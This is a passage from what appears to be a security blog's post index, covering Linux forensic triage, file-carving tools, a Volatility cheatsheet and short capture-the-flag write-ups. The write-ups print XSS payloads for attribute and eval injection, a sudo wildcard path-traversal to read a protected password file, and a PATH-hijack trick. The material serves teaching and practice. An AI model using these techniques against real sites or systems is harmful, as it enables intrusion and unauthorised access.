registered logins of users without a shell inside /etc/passwd Check for password hashes inside /etc/shadow for users without a shellDisk ImagingTaking an image of the diskIt’s important to note that before connecting to your computer anything related to the case, you need to be sure that it’s going to be mounted as read only to avoid modifying the any information.#Create a raw copy of the disk$ dd if=&amp;lt;subject device&amp;gt; of=&amp;lt;image file&amp;gt; bs=512#Raw copy with hashes along the way (more secure it checks hashes while it&#39;s copying the data)$ dcfldd if=&amp;lt;subject device&amp;gt; of=&amp;lt;image file&amp;gt; bs=512 hash=&amp;lt;algorithm&amp;gt; hashwindow=&amp;lt;chunk size&amp;gt; hashlog=&amp;lt;hash file&amp;gt;Disk Image pre-analysisImaging that you receive a disk image with no more data.#Find that it&#39;s actually a disk imageusing &quot;file&quot; command$ file disk.img #Check which type of disk image it&#39;s$ img_stat -t evidence.img #You can list supported types with$ img_stat -i list#Data of the image$ fsstat -i raw -f ext4 disk.img #ls inside the image$ fls -i raw -f ext4 disk.img#ls inside folder$ fls -i raw -f ext4 disk.img 12#cat file inside image$ icat -i raw -f ext4 disk.img 16Search for known MalwareModified System FilesSome Linux systems have a feature to verify the integrity of many installed components, here some ways to do it.#RedHat$ rpm -Va#Debian$ dpkg --verify$ debsums | grep -v &quot;OK$&quot;#Arch$ paccheck (part of pacutils)Search installed programsPackage ManagerDifferent ways to check installed packages:#Debian$ cat /var/lib/dpkg/status | grep -E &quot;Package:|Status:&quot;$ cat /var/log/dpkg.log | grep installed#RedHat$ rpm -qa --root=/ mntpath/var/lib/rpm#Arch$ pacman -QOtherNot all installed programs will be listed by the above commands. Locations such as /usr/local and /opt may reveal other apps that have been compiled and installed from source code.ls /opt /usr/localAnother good idea is to check the common folders inside $PATH for binaries not related to installed packages:#Debianfind /sbin/ -exec dpkg -S {} \\; | grep &quot;no path found&quot;#RedHatfind /sbin/ –exec rpm -qf {} \\; | grep &quot;is not&quot;Inspect AutoStart locationsScheduled Taskscat /var/spool/cron/crontabs/* \\/var/spool/cron/atjobs \\/var/spool/anacron \\/etc/cron* \\/etc/at* \\/etc/anacrontab \\/etc/incron.d/* \\/var/spool/incron/* \\Other AutoStart LocationsThere are several configuration files that Linux uses to automatically launch an executable when a user logs into the system that may contain traces of malware. /etc/profile.d/* , /etc/profile , /etc/bash.bashrc are executed when any user account logs in. ∼/.bashrc , ∼/.bash_profile , ~/.profile , ∼/.config/autostart are executed when the specific user logs in. /etc/rc.local It is traditionally executed after all the normal system services are started, at the end of the process of switching to a multiuser runlevel.Examine LogsLook in all available log files on the compromised system for traces of malicious execution and associated activities such as creation of a new service.Pure LogsLogon events recorded in the system and security logs, including logons via the network, can reveal that malware or an intruder gained access to a compromised system via a given account at a specific time.Interesting system logons: /var/log/syslog (debian) or /var/log/messages (Redhat) Shows general messages and info regarding the system. /var/log/auth.log (debian) or /var/log/secure (Redhat) Keep authentication logs for both successful or failed logins, and authentication processes. cat /var/log/auth.log | grep -iE &quot;session opened for|accepted password|new session|not in sudoers&quot; /var/log/boot.log: start-up messages and boot info. /var/log/maillog or var/log/mail.log: is for mail server logs. /var/log/kern.log: keeps in Kernel logs and warning info. /var/log/dmesg: a repository for device driver messages. Use dmesg to see messages in this file. /var/log/faillog: records info on failed logins. Handy for examining potential security breaches like login credential hacks and brute-force attacks. /var/log/cron: keeps a record of cron jobs. Like when the cron daemon started a job. /var/log/daemon.log: keeps track of running background services. /var/log/btmp: keeps a note of all failed login attempts. /var/log/httpd/: a directory containing error_log and access_log files of the Apache httpd daemon. /var/log/mysqld.log or /var/log/mysql.log : MySQL log file that records every debug, failure and success message, including starting, stopping and restarting of MySQL daemon mysqld. /var/log/xferlog: keeps FTP file transfer sessions. /var/log/* : You should always check for unexpected logs in this directoryCommand HistoryMany Linux systems are configured to maintain a command history for each user account: ~/.bash_history ~/.history ~/.*_historyLoginsUsing the command last -Faiwx it’s possible to get the list of users that have logged in.It’s recommended to check if those logins make sense: Any unknown user? Any user that shouldn’t have a shell has logged in?This is important as attackers some times may copy /bin/bash inside /bin/false so users like lightdm may be able to login.Application Traces SSH: Connections to systems made using SSH to and from a compromised system result in entries being made in files for each user account (∼/.ssh/authorized_keys and ∼/.ssh/known_keys). These entries can reveal the hostname or IP address of the remote hosts. Gnome Desktop: User accounts may have a ∼/.recently-used.xbel file that contains information about files that were recently accessed using applications running in the Gnome desktop. VIM: User accounts may have a ∼/.viminfo file that contains details about the use of VIM, including search string history and paths to files that were opened using vim. Office: Recent files. MySQL: User accounts may have a ∼/.mysql_history file that contains queries executed using MySQL. Less: User accounts may have a ∼/.lesshst file that contains details about the use of less, including search string history and shell commands executed via lessUSB Logsusbrip is a small piece of software written in pure Python 3 which parses Linux log files (/var/log/syslog* or /var/log/messages* depending on the distro) for constructing USB event history tables.It is interesting to know all the USBs that have been used and it will be more useful if you have an authorized list of USB to find “violation events”.Installationpip3 install usbripusbrip ids download #Download databaseExamples#Get USB history of your curent linux machine$ usbrip events history#Search by pid OR vid OR user$ usbrip events history --pid 0002 --vid 0e0f --user kali #Search for vid and/or pid$ usbrip ids download #Downlaod database#Search for pid AND vid$ usbrip ids search --pid 0002 --vid 0e0fExamine File SystemFile system data structures can provide substantial amounts of information related to a malware incident, including the timing of events and the actual content of malware.To deal with such anti-forensic techniques, it is necessary to pay careful attention to time line analysis of file system date-time stamps and to files stored in common locations where malware might be found. Using autopsy you can see the timeline of events that may be useful to discover suspicions activity. You can also use the mactime feature from Sleuth Kit directly. Check for unexpected scripts inside $PATH. Files in /dev use to be special files. Look for unusual or hidden files and directories, like “.. ” or “..^G ”. setuid copies of /bin/bash on the system find / -user root -perm -04000 –print Also check directories like /bin or /sbin as the modified and/or changed time of new or modified files me be interesting. It’s interesting to see directories sorted by creation date instead alphabetically to see which files/folders are more recent and inodes. You can check the most recent files of a folder usingls -laR --sort=time /bin. You can check the inodes of the files inside a folder usingls -lai /bin | sort -n " }, { "title": "[Notes] Carving tools", "url": "/notes/forensics/carving-tools", "categories": "Notes, Forensics", "tags": "forensics, tools, linux", "date": "2022-05-10 13:53:00 +0200", "snippet": "AutopsyThe most common tool used in forensics to extract files from images is Autopsy. Download it, install it and make it ingest the file to find “hidden” files. Note that Autopsy is built to support disk images and other kind of images, but not simple files.BinwalkBinwalk is a tool for searching binary files like images and audio files for embedded files and data.It can be installed with apt or yay however the source can be found on github.Useful commands:binwalk file #Displays the embedded data binwalk -e file #Displays and extracts binwalk --dd &quot;.*&quot; file #Displays and extracts all filesForemostAnother common tool to find hidden files is foremost. You can find the configuration file of foremost in /etc/foremost.conf. If you just want to search for some specific files uncomment them. If you don’t uncomment anything foremost will search for it’s default configured file types.sudo apt-get install foremostforemost -v -i file.img -o output#Discovered files will appear inside the folder &quot;output&quot;ScalpelScalpel is another tool that can be use to find and extract files embedded in a file. In this case you will need to uncomment from the configuration file (/etc/scalpel/scalpel.conf) the file types you want it to extract.sudo apt-get install scalpelscalpel file.img -o outputBulk ExtractorThis tool comes inside kali but you can find it here: https://github.com/simsong/bulk_extractorThis tool can scan an image and will extract pcaps inside it, network information(URLs, domains, IPs, MACs, mails) and more files. You only have to do:bulk_extractor memory.img -o out_folderNavigate through all the information that the tool has gathered (passwords?), analyse the packets, search for weird domains (domains related to malware or non-existent).PhotoRecDesigned to recover lost files from various digital camera memory, hard disk…You can find it here.binvisCheck the web page tool.BinVis is a great start-point to get familiar with an unknown target in a black-boxing scenario.Complementary toolsYou can use viu to see images form the terminal.You can use the linux command line tool pdftotext to transform a pdf into text and read it.Sources Hacktricks" }, { "title": "[Notes] Volatility Cheatsheet", "url": "/notes/forensics/volatility", "categories": "Notes, Forensics", "tags": "forensics, volatility, tools, cheatsheet, linux", "date": "2022-05-02 20:01:00 +0200", "snippet": "Below are some of the more commonly used plugins from Volatility 2 and their Volatility 3 counterparts.OS Informationimageinfo Volatility 2vol.py -f “/path/to/file” imageinfovol.py -f “/path/to/file” kdbgscan Volatility 3vol.py -f “/path/to/file” windows.infoOutput differences: Volatility 2: Additional information can be gathered with kdbgscan if an appropriate profile wasn’t found with imageinfo Volatility 3: Includes x32/x64 determination, major and minor OS versions, and kdbg informationProcess Informationpslist Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; pslistvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; psscanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; pstreevol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; psxview Volatility 3vol.py -f “/path/to/file” windows.pslistvol.py -f “/path/to/file” windows.psscanvol.py -f “/path/to/file” windows.pstreeOutput differences: Volatility 2: Additional process lists with psxview Volatility 3: Does not include a direct psxview equivalentprocdump Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; procdump -p &amp;lt;PID&amp;gt; ‑‑dump-dir=“/path/to/dir” Volatility 3vol.py -f “/path/to/file” -o “/path/to/dir” windows.dumpfiles ‑‑pid &amp;lt;PID&amp;gt;Output differences: Volatility 2: Just outputs specified PID Volatility 3: Dumps exe and associated DLLsmemdump Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; memdump -p &amp;lt;PID&amp;gt; ‑‑dump-dir=“/path/to/dir” Volatility 3vol.py -f “/path/to/file” -o “/path/to/dir” windows.memmap ‑‑dump ‑‑pid &amp;lt;PID&amp;gt;handles Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; handles -p &amp;lt;PID&amp;gt; Volatility 3vol.py -f “/path/to/file” windows.handles ‑‑pid &amp;lt;PID&amp;gt;Output differences: Volatility 2: Offset(V), PID, handle, access, type, details Volatility 3: PID, process, offset, handlevalue, type, grantedaccess, namedlls Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; dlllist -p &amp;lt;PID&amp;gt; Volatility 3vol.py -f “/path/to/file” windows.dlllist ‑‑pid &amp;lt;PID&amp;gt;Output differences: Volatility 2: PID, command line, base, size, loadcount, loadtime, path Volatility 3: PID, process, base, size, name, path, loadtime, file outputcmdline Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; cmdlinevol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; cmdscanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; consoles Volatility 3vol.py -f “/path/to/file” windows.cmdlineOutput differences: Volatility 2: process name, PID, commandline; cmdscan includes application, flags, process handle; consoles contains C:\\ listing, original titles, screen position and command history information Volatility 3: PID, process name, argsNetwork Informationnetscan Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; netscanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; netstat- XP/2003 SPECIFICvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; connscanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; connectionsvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; sockscanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; sockets Volatility 3vol.py -f “/path/to/file” windows.netscanvol.py -f “/path/to/file” windows.netstatNote: The XP/2003 specific plugins are deprecated and therefore not available in Volatility 3Registryhivelist Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; hivescanvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; hivelist Volatility 3vol.py -f “/path/to/file” windows.registry.hivescanvol.py -f “/path/to/file” windows.registry.hivelistprintkey Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; printkeyvol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; printkey -K “Software\\Microsoft\\Windows\\CurrentVersion” Volatility 3vol.py -f “/path/to/file” windows.registry.printkeyvol.py -f “/path/to/file” windows.registry.printkey ‑‑key “Software\\Microsoft\\Windows\\CurrentVersion”hivedump Volatility 2vol.py -f “/path/to/file” ‑‑profile hivedump -o &amp;lt;offset&amp;gt; Volatility 3I’m not sure if this capability exists in Vol3; however, you may be able to extract registry hives using filedump with the offsetFilesfilescan Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; filescan Volatility 3vol.py -f “/path/to/file” windows.filescanfiledump Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; dumpfiles ‑‑dump-dir=“/path/to/dir”vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; dumpfiles ‑‑dump-dir=“/path/to/dir” -Q &amp;lt;offset&amp;gt;vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; dumpfiles ‑‑dump-dir=“/path/to/dir” -p &amp;lt;PID&amp;gt; Volatility 3vol.py -f “/path/to/file” -o “/path/to/dir” windows.dumpfilesvol.py -f “/path/to/file” -o “/path/to/dir” windows.dumpfiles ‑‑virtaddr &amp;lt;offset&amp;gt;vol.py -f “/path/to/file” -o “/path/to/dir” windows.dumpfiles ‑‑physaddr &amp;lt;offset&amp;gt;Miscellaneousmalfind Volatility 2vol.py -f “/path/to/file” ‑‑profile &amp;lt;profile&amp;gt; malfind Volatility 3vol.py -f “/path/to/file” windows.malfindOutput differences: Volatility 2: PID, process name, address, VAD tags, hexdump, and shellcode Volatility 3: PID, process name, process start, protection, commit charge, privatememory, file output, hexdump disassemblyyarascan Volatility 2vol.py -f “/path/to/file” yarascan -y “/path/to/file.yar” Volatility 3vol.py -f “/path/to/file” windows.vadyarascan ‑‑yara-rules &amp;lt;string&amp;gt;vol.py -f “/path/to/file” windows.vadyarascan ‑‑yara-file “/path/to/file.yar”vol.py -f “/path/to/file” yarascan.yarascan ‑‑yara-file “/path/to/file.yar”Sources ONFVP Blog" }, { "title": "[Root Me] Encoding", "url": "/root-me/crypto/Encoding", "categories": "Root-Me, Crypto", "tags": "easy, challenge, crypto", "date": "2022-04-29 01:50:00 +0200", "snippet": "ASCIIThis is the string to decrypt, we see a bunch of alphanumerics characters…4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465When I saw it I knew it was hex. then If we go to Cyberchef and decode From Hex we get this:Le flag de ce challenge est: 2ac376481ae546cd...UUFor this challenge this is the string to decode:_=_ _=_ Part 001 of 001 of file root-me_challenge_uudeview_=_ begin 644 root-me_challenge_uudeviewB5F5R&amp;gt;2!S:6UP;&amp;amp;4@.RD*4$%34R`](%5,5%)!4TE-4$Q%&quot;@```endI don’t even know what encoding are this, but with one search I find out. The site for decode this is dcode.fr. and… here is the flag:PASS = ULT..." }, { "title": "[XSSG] Ugandan Knuckles", "url": "/others/xssgame/Ugandan-knuckles", "categories": "Others, XSSgame", "tags": "easy, warmups, xss, challenge", "date": "2022-04-29 00:00:00 +0200", "snippet": "ChallengeThis is the script that violates the web&amp;lt;!-- Challenge --&amp;gt;&amp;lt;div id=&quot;uganda&quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script&amp;gt; let wey = (new URL(location).searchParams.get(&#39;wey&#39;) || &quot;do you know da wey?&quot;); wey = wey.replace(/[&amp;lt;&amp;gt;]/g, &#39;&#39;) uganda.innerHTML = `&amp;lt;input type=&quot;text&quot; placeholder=&quot;${wey}&quot; class=&quot;form-control&quot;&amp;gt;`&amp;lt;/script&amp;gt;SolutionIn this challenge we see that the code removes the &amp;lt;&amp;gt; and that everything we enter is entered in an input so we will take advantage of that to enter a script that is activated when it focuses and with autofocus as soon as the page loads it will be runnedUgandan KnucklesCreator solutionThe solution given by the creator of the game is as follows&quot;onfocus=alert(1337) autofocus=&quot;" }, { "title": "[XSSG] Ma Spaghet!", "url": "/others/xssgame/Ma-spaghet", "categories": "Others, XSSgame", "tags": "easy, warmups, xss, challenge", "date": "2022-04-29 00:00:00 +0200", "snippet": "ChallengeThis is the script that violates the web&amp;lt;!-- Challenge --&amp;gt;&amp;lt;h2 id=&quot;spaghet&quot;&amp;gt;&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt; spaghet.innerHTML = (new URL(location).searchParams.get(&#39;somebody&#39;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;&amp;lt;/script&amp;gt;SolutionWe have only to add a simple XSS, with img and the option alt we display something in the website and for execute some js we use onclick or onmouseover function to run the codeSomebody Toucha Ma Spaghet!Creator solutionThe solution given by the creator of the game is as follows&amp;lt;svg onload=alert(1337)&amp;gt;" }, { "title": "[XSSG] Jefff", "url": "/others/xssgame/Jefff", "categories": "Others, XSSgame", "tags": "easy, xss, warmups, challenge", "date": "2022-04-29 00:00:00 +0200", "snippet": "ChallengeThis is the script that violates the web&amp;lt;!-- Challenge --&amp;gt;&amp;lt;h2 id=&quot;maname&quot;&amp;gt;&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt; let jeff = (new URL(location).searchParams.get(&#39;jeff&#39;) || &quot;JEFFF&quot;) let ma = &quot;&quot; eval(`ma = &quot;Ma name ${jeff}&quot;`) setTimeout(_ =&amp;gt; { maname.innerText = ma }, 1000)&amp;lt;/script&amp;gt;SolutionFor this challenge we see that the code has an eval, this is a function that what it does is evaluates JavaScript code represented as a string. So we have to escape that function somehow, I’ve escaped it using “-example-“Ma name JEFFFCreator solutionThe solution given by the creator of the game is as follows&quot;-alert(1337)-&quot;" }, { "title": "[Root Me] Weak Configuration", "url": "/root-me/script/weak-configuration", "categories": "Root-Me, Script", "tags": "easy, challenge, script", "date": "2022-04-26 21:08:00 +0200", "snippet": "We got an access via ssh:ssh -p 2222 app-script-ch1@challenge02.root-me.orgWhen we enter with our username and password we see this in the personal directory, a file named readme.md:You have to read the .passwd located in the following PATH : /challenge/app-script/ch1/ch1cracked/Later that I do an sudo -l to see what we can execute with sudo and with what user.User app-script-ch1 may run the following commands on challenge02: (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*`We see there is a same named user but cracked that can execute cat on /challenge/app-script/ch1/notes/*Then is so easy, we just have to follow this path but replacing the * for ../ch1cracked/.passwd and we got the flag…" }, { "title": "[Root Me] Bash-System 1", "url": "/root-me/script/Bash-System-1", "categories": "Root-Me, Script", "tags": "easy, challenge, script", "date": "2022-04-24 21:08:00 +0200", "snippet": "We need to copy cat into /tmp, then change the name to “ls” and change the path to that folder.Now the script will read it as cat.&amp;gt; mkdir /tmp/isntma&amp;gt; cp /bin/cat /tmp/isntma&amp;gt; mv /tmp/isntma/cat /tmp/isntma/ls&amp;gt; export PATH=/tmp/isntma:$PATH&amp;gt; ./ch11" } ]
